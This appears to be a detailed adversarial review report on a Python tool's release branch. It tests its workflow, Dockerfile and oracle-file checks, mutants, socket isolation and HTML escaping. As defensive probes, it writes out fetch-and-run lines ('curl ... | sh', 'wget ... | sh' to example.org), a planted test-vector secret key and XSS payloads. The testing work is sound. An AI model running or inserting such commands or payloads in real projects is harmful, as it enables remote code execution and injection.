# A-P3 lens 3, fresh attack: build day 9, lane A at `43521dd` (branch `a-p3-release`)

**Verdict: PASS.** No blocker. Lens 2's blocker FA2-B1 is closed on every input I fed, at the CLI in a source checkout and in an installed wheel. Two sentence violations were introduced or left open by repair 2 (FA3-S1 in `tests/test_workflows.py`, FA3-S2 in the repair note); by the repair rule they are fixed before the round counts as closed. One further sentence violation predates this diff (FA3-S3). Six record-and-carry findings follow.

Written 24 September 2026 by a cold fresh-attack lens session. I committed nothing, pushed nothing and made no tag. Every figure below was measured in this session on Windows 11, `win-amd64-cp314` (Python 3.14.6, numpy 2.5.1, scipy 1.18.1), in Git Bash unless a row says PowerShell 5.1. None comes from the reference platform (`python:3.12-slim` linux/amd64). No image was built or pulled, nothing was installed from an index, and no workflow ran. I worked in detached worktrees under `scratchpad/lens-AP3-r3-fresh-attack/`:

- `wt` at `43521dd` (suite, markers, lint, sweep);
- `probe` at `43521dd` (CLI edits of the oracle files, each restored; `git status` clean afterwards);
- `mut` at `43521dd` (my mutants, each reverted);
- `old` at `a09a0ef` (the repair-2 tests copied in, then deleted).

`PYTHONPATH` was forced to each worktree's `src`, and `python -c "import proofpack;print(proofpack.__file__)"` printed that worktree's `src\proofpack\__init__.py` each time. The installed-wheel figures come from a venv whose `proofpack.__file__` was `...\venv\Lib\site-packages\proofpack\__init__.py`, with `PYTHONPATH` unset. All four worktrees are removed.

## Blockers

None.

The grading rule lists "a test that passes at a09a0ef". Six of the 29 tests in `tests/test_ap3_repair2.py` pass at `a09a0ef` (measured: `23 failed, 6 passed`). I do not grade that as a blocker. Five of them are declared in the file's docstring and in the note as mutant-killers for code the lens found correct (FA2-R1 / RG2-N1). The committed sweep kills each of their mutants: `ap3_checkout_project_name_not_read`, `ap3_non_dict_engine_result_not_caught`, `ap3_oracle_value_reason_dropped` and `ap3_empty_row_deviation_zero`. The sixth, `test_each_tolerance_rule_lists_its_rows[reported_rounding]`, pins a rule that already listed its rows; the other two parametrisations fail at `a09a0ef`. Every code defect repair 2 fixed has at least one test that fails at `a09a0ef`: FA2-B1, FA2-R2, FA2-R4, FA2-R5, FA2-R6, FA2-R8, FA2-R9 and RG2-N3. For FA2-R3 / RG2-S1, the four new `LENS_COUNTER_EXAMPLES` lines each gave `0` violations from `a09a0ef`'s `offline_violations` (I re-ran them).

## Sentence violations (non-blocking, to be fixed)

### FA3-S1. `tests/test_workflows.py` says the check needs `--offline` "as a word of its own", and `--out=--offline` passes it

Verbatim, the module docstring: "carries ``--offline`` as a word of its own (``OFFLINE_FLAG``) before any `` #`` comment mark". Verbatim, the comment on `OFFLINE_FLAG`: "``--offline`` as a word of its own: ``--out out--offline`` and ``./--offline-dir`` are not it".

`OFFLINE_FLAG` is `(?<![\w./-])--offline(?![\w/-])`. `=` and `>` are outside the look-behind class. I appended each line below as one `run:` step to the parsed `release.yml`'s `build` job and called `offline_violations`:

| Line (engine runs without the flag) | Result |
|---|---|
| `proofpack run --input a --criteria b --out=--offline` | MISSED (0) |
| `OPT=--offline proofpack run --input a --criteria b` | MISSED (0) |
| `docker run --rm -e PROOFPACK_OFFLINE=--offline proofpack:ci run --input a` | MISSED (0) |
| `proofpack run --input a --criteria b >--offline.log` | MISSED (0) |
| `proofpack run --input a --criteria b & echo --offline` (a single `&` is not a separator) | MISSED (0) |
| `proofpack fixtures --out=out --html  #--offline` | caught |

The engine's parser reads the first line as online. `_build_parser().parse_args(['run','--input','a','--criteria','b','--out=--offline'])` gives `out --offline offline False`. `['fixtures','--out=--offline']` gives the same. In none of these lines is `--offline` a word of its own, yet the check accepts each one.

The committed workflows contain none of these lines. `offline_violations` returns `[]` for both files. The engine-call counts are `ci.yml` 5 and `release.yml` 6, and I read each of the 11 lines: each carries `--offline` as its own word. The `release.yml` header ("asserts --offline on each command its ... patterns match") is the same claim in weaker words.

- Repro: `PYTHONPATH=<wt>/src python -c "import test_workflows as tw; d=tw._load('release.yml'); d['jobs']['build']['steps'].append({'run':'proofpack run --input a --criteria b --out=--offline'}); print(tw.offline_violations(d))"` (run in `tests/`) prints `[]`.
- Fix: add `=` and `>` to the look-behind class, and add the lines above to `LENS_COUNTER_EXAMPLES`. Or narrow both sentences to the inputs the tests feed.

### FA3-S2. The repair note's decision 4 says "An unreadable oracle file is `not_matched`, exit 6"; a directory in its place exits 5 with no report

Verbatim, from `AP3_repair2.md`, decisions taken: "**An unreadable oracle file is `not_matched`, exit 6**, with the reason `oracle_file_unreadable: <file> (<type>)`."

`load_oracles` catches `FileNotFoundError` and `ValueError` only, and a read that raises any other `OSError` escapes. In `probe`:

- `fixtures/newcombe_table2.json` replaced by a directory: `internal error: PermissionError: [Errno 13] Permission denied: '...\probe\fixtures\newcombe_table2.json'`, exit 5, no output directory.
- `fixtures/oracles_v1.json` replaced by a directory: `PermissionError`, exit 5, no report.

Nothing reads as matched, and the exit is non-zero. The code's own sentences hold: the `load_oracles` docstring says "a file that raises ``ValueError`` when parsed is named in ``unreadable``". The generalisation is in the note only, and the note is headed for `handoffs/`.

- Repro (checkout): `rm fixtures/newcombe_table2.json && mkdir fixtures/newcombe_table2.json && python -m proofpack.cli fixtures --offline --out D` gives exit 5 and no `D`.
- Fix: narrow the sentence to "a file that does not parse (`ValueError`)", or catch `OSError` in `load_oracles`, record it in `unreadable`, and add a test for it.

### FA3-S3 (predates this diff). The test name `test_no_secret_looking_env_or_arg_and_no_key_material` states more than the test inspects

The test inspects `ENV` / `ARG` names, the strings `BEGIN` and `PRIVATE KEY`, and `.lic` / `.pem` / `.key` in `COPY` / `ADD`. I planted `LABEL k=9d61b19deffd5a60ba844af492ec2cc44449c5697b326919703bac031cae7f60` (the RFC 8032 test-vector Ed25519 secret key, 32 bytes in hex) before `USER proofpack` and called every `text` test in `tests/test_dockerfile.py`: `PASSES ALL`. The name is carried unchanged from `83b05a5`, and lens 1's FA-R6 renamed its sibling for the same reason.

## Non-blocking (record and carry)

**FA3-R1. Two surviving non-equivalent mutants in the repair-2 code.** I ran each in `mut` against `-m "ap3 or day9 or ap2"` with `--ignore-glob=tests/test_sweep*.py`. The sweep's pattern-count tests are excluded because they fail on any edit of a swept line; with them left in, the first mutant read as killed by `test_sweep_ap3.py:44` alone.

- `except ValueError as exc:  # JSONDecodeError, UnicodeDecodeError` → `except json.JSONDecodeError as exc:`: `363 passed`. It is non-equivalent. On the shipped code, `oracles_v1.json` with one `0xff` byte appended gives `oracle_file_unreadable: oracles_v1.json (UnicodeDecodeError)`, `matched 4, not matched 26`, exit 6. Under the mutant, the `UnicodeDecodeError` escapes and the command exits 5 with no report. No test feeds bytes that are not valid UTF-8, though the comment names `UnicodeDecodeError`.
- `scripts/f17_determinism.py`: the `file_names` SHA-256 replaced by `str(len(names))` gives `-m ap3` `128 passed`. `test_f17_detects_a_file_added_to_one_run` adds a file, so a count still differs. A run pair with the same number of files but different names would read `identical`.

Six more of my mutants were killed:
- `tol.get(name)` → `tol.get(name, 1e-9)`;
- the compared set drawn from the engine's keys instead of `Row.compares`;
- the `OracleFileUnreadable` handler removed;
- `r_captures_status` reading `<package>/../..` whatever the tree;
- `_f14_oracle` ignoring `unreadable`;
- the F14 tolerance widened to 3 dp.

**FA3-R2. FA2-R2's class persists for the files that ship.** `resources._CANDIDATES` still lists `../../fixtures/oracles_v1.json` and `../../fixtures/f4_expected.json` after `_fixtures/...`. I built a tree `X/src/proofpack` with no `_fixtures`, no `pyproject.toml` and a planted `X/fixtures/oracles_v1.json`, pointed `fx.__file__` and `resources._PKG_DIR` at it as the repair-2 tests do, and got:
- `resource_path("oracles_v1.json")` gives `...\Xinst\fixtures\oracles_v1.json`;
- `source_checkout_root()` gives `None`, and `git_sha()` gives `(None, 'not a git checkout ...')`;
- `F1-wilson` is `matched`, and `oracle_source.file` is `fixtures/oracles_v1.json`.

This fallback is reached only when the in-package copy is absent. Repair 1's decision 1 calls that absence an install defect reported as `not_matched`, but here a file from outside the package is read in its place. No shipped sentence claims otherwise.

**FA3-R3. The reported-rounding tolerance for the bootstrap rows is read from the oracle file.** `_register` computes it from `register_decimals.F3_bootstrap`. With `register_decimals.F3_bootstrap` set to `0` and `register.F3_bootstrap.ci_lo` set to `0.8` (the engine gives 0.44), `F3-bootstrap` and `F9-cluster-bootstrap` read `matched`, `max 0.36000000000000004`, exit 0. The report does print the tolerance it used (`0.500000000001`). This is the oracle-tampering class, the same as editing a value, which the source checkout's `capture_fixture_oracles.py --check` inspects and an installed wheel does not.

**FA3-R4. `tests/test_dockerfile.py` passes six planted lines the committed Dockerfile does not contain.** Each was inserted before `USER proofpack` and every `text` test called; each gave `PASSES ALL`:
- `HEALTHCHECK CMD curl -fsS https://proofpack.globalphoenix.co.uk/api/telemetry || exit 1`;
- `ONBUILD RUN curl -fsSL https://example.org/i.sh | sh`;
- `SHELL ["/bin/sh", "-c", "wget -qO- https://example.org | sh"]`;
- `ENV PROOFPACK_LICENCE=eyJhbGciOiJFZERTQSJ9.payload.sig`;
- `CMD ["run", "--input", "/work/a.csv", "--criteria", "/work/c.yaml"]` (no `--offline`; the committed `CMD` is `["doctor", "--offline"]`);
- the `LABEL` of FA3-S3.

`ADD --checksum=sha256:00 http://example.org/x /x` is caught. Read by hand, the committed Dockerfile has one `FROM` (tag only, marked `[unverified]`), two `COPY`s, one `RUN`, no `ADD`, `HEALTHCHECK`, `ONBUILD`, `SHELL` or `LABEL`, and `USER proofpack` last.

**FA3-R5. A Newcombe file deleted from a source checkout gives `no_oracle_recorded`, exit 0, and the reason does not say it is absent.** With `fixtures/newcombe_table2.json` deleted in `probe`, `F14-newcombe` is `no_oracle_recorded`, exit 0, summary `matched 29 ... no oracle recorded 3`. The printed reason is `NEWCOMBE_ABSENT`: "... is not shipped in the wheel ...; it is read only when the package is <root>/src/proofpack and <root>/pyproject.toml names proofpack". Here that condition holds, and the file was still not read. The `NEWCOMBE_ABSENT` comment names both causes, while the module docstring's `no_oracle_recorded` bullet names only the install cause. Nothing is counted as matched. In the same checkout, a deleted `oracles_v1.json` is `not_matched`.

**FA3-R6. Mutable action refs in jobs with write permission (FA-R10 class, carried).**
- `pypa/gh-action-pypi-publish@release/v1` is a branch ref, in `testpypi`, which holds `id-token: write`.
- `aquasecurity/trivy-action@0.28.0` is a tag, in `image`, which holds `packages: write`.

Neither job has run.

**Carried and re-read, still open:** RG2-N2's remaining forms (as the note lists them), FA-R8, FA-R9 (L1, L2, L5, L6, L8, L14), FA-R12, RG-N6, RG-N7 and RG-N8.

## Lens-2 findings: closed (re-measured)

- **FA2-B1 (blocker), CLI in `probe`.**
  - `f14_label`: the `9/10 - 3/10` label rewritten as `9/10-3/10` gives `not_matched`, n = 16, eight reasons (four `oracle value missing`, four `engine value missing`), exit 6.
  - `f14_extra`: an extra example `8/10 - 3/10` gives `not_matched` (`engine value missing` ×4), exit 6.
  - `f14_empty`: `examples: []` gives `not_matched` (12 × `oracle value missing`), exit 6.
  - `extra_key`: `wilson_mid` added to the oracle gives `engine value missing: wilson_mid`, exit 6.
  - `nan_lit`: `"wilson_lo": NaN` gives `oracle value not finite (nan): wilson_lo`, exit 6.
- **FA2-B1, installed wheel.** I built the wheel with `python -m uv build --wheel --offline` (the wheel carries no `newcombe` entry: `0`) and installed it with `pip --no-deps --no-index` into a fresh `venv --system-site-packages`.
  - Intact: `matched 29, not matched 0, no oracle recorded 3`, exit 0.
  - I deleted `captured.F3-delong.values.paired_p` and `register.F6.holm_2` from that install's `_fixtures/oracles_v1.json`. Result: `matched 27, not matched 2`, `not matched: F3-delong (oracle value missing: paired_p)`, `not matched: F6-register (oracle value missing: holm_2)`, exit 6.
  - `git_sha` is `None`, and F14 is `no_oracle_recorded` with the `[unverified against the primary PDF]` reason.
- **A missing value reaching T12.** I deleted `captured.F2-exact.values.mcc` and `register.F8.half_width_n50` in process. `validate_report` passes. Summary `matched 28, not_matched 2`, exit 6. `scripts/build_t12.py` wrote 47,449 bytes. The F2-exact row reads "17 — not matched oracle value missing: mcc", and the F8-register row reads "3 — not matched oracle value missing: half_width_n50". The status table reads "matched 28 not matched 2 ... Exit code of proofpack fixtures 6".
- **FA2-R2.** The `newcombe_table2.json` candidate is gone from `resources._CANDIDATES`. The two installed-layout tests pass. A Newcombe file in a checkout with `provenance.status` set to `checked` gives `unverified False`, marking `checked`. That is the file's own marking, as the note states.
- **RG2-N3.**
  - Top-level `[]` gives `oracle_error: TypeError`, `matched 4, not matched 26`, exit 6.
  - A UTF-8 BOM gives `oracle_file_unreadable: oracles_v1.json (JSONDecodeError)`, exit 6.
  - A trailing `0xff` gives `(UnicodeDecodeError)`, exit 6.
  - A directory in the file's place: FA3-S2.
- **FA2-R9.** `compare(run1, copy)` with a file added gives `file_names` False. The mutant is killed only by its count (FA3-R1).
- **FA2-R3 / RG2-S1.** The four new counter-examples are caught at `43521dd` and missed at `a09a0ef`. New forms: FA3-S1.
- **FA2-R7.** `COPY --from=...`, `COPY signing.txt` and an unhashed `RUN pip install` are caught by `test_the_copies_and_the_run_are_the_ones_written`. The remaining forms are listed in FA3-R4.
- **FA2-R6.** `if: always()` is on the ZAP upload step. The step name no longer states behaviour. Never run.

## What I could not break (what I tried)

- **Tolerance edges, with the deviation computed by me** (CLI, file edited, restored):
  - `F6-p.chi2_p` (iterative, 1e-6):
    - engine 0.09863159462846645;
    - +1 ulp: deviation 1.39e-17, matched, exit 0;
    - oracle = engine + 1e-6: deviation `1.000000000001e-06` (float), not matched, exit 6;
    - +2e-6: not matched, exit 6;
    - +1e-6 − 1e-15: deviation `9.999999990017994e-07`, matched, exit 0.
  - `F14 9/10 - 3/10 method10 lower` (reported rounding, tolerance `5.0000001000000005e-05`):
    - +tol: deviation `5.000000100000013e-05`, not matched, exit 6;
    - +2 tol: not matched, exit 6;
    - +1 ulp: matched.
  - The report's deviation equals mine in every case.
- **Independent re-derivations** (my own formulae, no repo code):
  - Wilson 81/263 (z = 1.959963984540054) = (0.2552885198782742, 0.36620957698280004), equal to the engine.
  - Newcombe method 10 (square-and-add of Wilson intervals) for the three `F14_CASES`: (0.05243147240236498, 0.333872654036906), (0.17052272393450302, 0.8090179735354881) and (0.6790860371419147, 1.0). They equal the engine to ≤ 1e-16, and the file's 4-dp values (0.1705, 0.809) round to them.
- **Sockets.** I installed a `sitecustomize` audit hook, inherited through `PYTHONPATH` by every subprocess, that raises on every `socket.*` event except `gethostname`. I proved it by refusing a `create_connection`. Under it I ran:
  - `fixtures` without `--offline`: exit 0;
  - `fixtures --offline --html --r-captures`: exit 0; T12 not written, "licence refused (no_file)";
  - `f17_determinism.py --n 400`: exit 0;
  - `build_t12.py`: 49,484 bytes.

  The log holds 4 `socket.gethostname` events, plus the one `getaddrinfo` from my own proof call. There is no connect, no socket creation and no other lookup.
- **F17.** Two script runs with `--n 5000` each printed the five checks `equal` with the same prefixes the note gives (`0c4b77b7789a0c64`, `a839493ed99f3925`, `ca4e145eb123633e`, `d306a3aa6600d4a4`, `7fe1d0490f327ef2`), and exit 0. Under my own regex mask of `run_id` / `started` / `duration_s`, all three files of all four runs are identical. Unmasked, only `/manifest/duration_s`, `/manifest/started` and `/manifest/run_id` differ, so the mask covers exactly the three keys it names.

  Flips against run1, each detected:
  - `"n": 5000` changed to 5001 in `run.json`: `run_json_masked` False;
  - one byte appended to `ingest_report.json`: False;
  - a newline appended to `pseudonyms.json`: False;
  - `T1.html` added: `file_names` False.

  A renamed `ingest_report.json` raises `FileNotFoundError` rather than reading identical. This is a same-platform repeat, not the reference platform.
- **T12.** In the page text, validated, compliant, certified, approved, CSA-compliant, meets and pass have 0 hits.
  - "qualified" appears only in "the manufacturer's qualified statistician", "endorsed" only in "No regulator has endorsed this tool", and "verified" only inside `[unverified`.
  - "This record supports, does not replace, the manufacturer's own validation" is present.
  - Each of the 6 AI-DSF anchors carries "draft guidance (January 2025), not for implementation". The other FDA mentions are CSA, marked `[unverified: ... not fetched]`.
  - Injection: a Newcombe label of `<script>alert(1)</script>` + U+202E + `<img src=x onerror=a>`, and a status of `[unverified <b>x</b>` + U+2066, flow through the new `oracle value missing: <name>` reason. The page has 0 raw `<script>alert`, 0 raw `<img`, 0 raw `<b>x</b>`, 0 U+202E and 0 U+2066; there are 4 `&lt;script&gt;` and 4 `&#x202e;`.
- **SBOM.** Two runs are byte-identical (`cmp`), `62 components: 13 required, 1 optional, 48 excluded`. My own `tomllib` parse of `uv.lock` has 63 packages, 62 non-project, with 0 missing and 0 extra, and 62 purls `pkg:pypi/<name>@<version>`. `scripts/sbom.py` and `uv.lock` are unchanged in `a09a0ef..43521dd`.
- **Workflows, read line by line.** Every engine call carries `--offline` (the 11 lines listed in FA3-S1). The only secret is `GITHUB_TOKEN`. There is no `pull_request_target`, and top-level `permissions: {}` in `release.yml`. The ZAP job scans the live site and runs no engine.
- **Damage elsewhere.** The diff touches nothing under `stats/`, and not `gates.py`, `errors.py`, `TOLERANCES` or any interval function. Markers pass (see below).
- **Committed sweep.** `python scripts/mutation_sweep.py --marker ap3` gave `25 planted, 25 killed, 0 survived; 259 s`.

## Re-run figures (`wt` at `43521dd`, PYTHONPATH forced and proved)

| Command | Result |
|---|---|
| `python -m pytest -q -p no:cacheprovider -x` | `1534 passed, 2 skipped, 1 xfailed in 127.75s`. The skips are `test_doctor_cli.py:57`, and `test_e8_repair4.py:405` because `confusables-18.0.0.txt` is looked up beside the tree. That is why this differs from the note's 1535 / 1 in `wt-ap3`. |
| `-m ap3` / `ap2` / `day8` / `day9` | `129 passed` / `89 passed` / `468 passed, 1 skipped` / `279 passed` |
| `-m day7` / `day6` / `day5` | `139` / `285` / `54 passed` |
| `-m ap3` in PowerShell 5.1 | `129 passed, 1408 deselected in 18.21s` |
| `ruff check .` / `ruff format --check .` | `All checks passed!` / `211 files already formatted` |
| `python -m proofpack.cli fixtures --offline --out D` | `rows 43: matched 30, not matched 0, no oracle recorded 2, not built 6, compared by the test suite only 5`, exit 0 (Git Bash and PowerShell 5.1) |
| `tests/test_ap3_repair2.py` copied into `a09a0ef` | `23 failed, 6 passed` |

## What I could not check

- **Every workflow job except `offline-namespace`, and the reference platform.** `docker-smoke`, `build`, `image`, Trivy, `testpypi`, `install-from-testpypi`, `github-release` and `zap-baseline` have never run. That includes the base-image digest, the action refs, Dependabot's `uv` ecosystem, and ZAP's exit behaviour under `-I` and `if: always()`. I did not read the `offline-namespace` runs myself.
- **The CycloneDX 1.5 schema.** It was not fetched.
- **A file without read permission** (as distinct from a directory). I did not revoke an ACL on this machine.

## Sentences I refused to write

- "`proofpack fixtures` reports every unreadable oracle file as not matched": FA3-S2.
- "The workflow test requires `--offline` as a word of its own": FA3-S1.
- "`proofpack fixtures` makes no network call": I measured the four invocations above under one audit hook, and nothing beyond them.
- "F17 compares the run directories' file names": it compares a hash of them, and a count-only mutant survives the tests (FA3-R1). The script's own sentence ("the sorted list of file paths") is true.
- "The Dockerfile test finds any key material": FA3-S3.
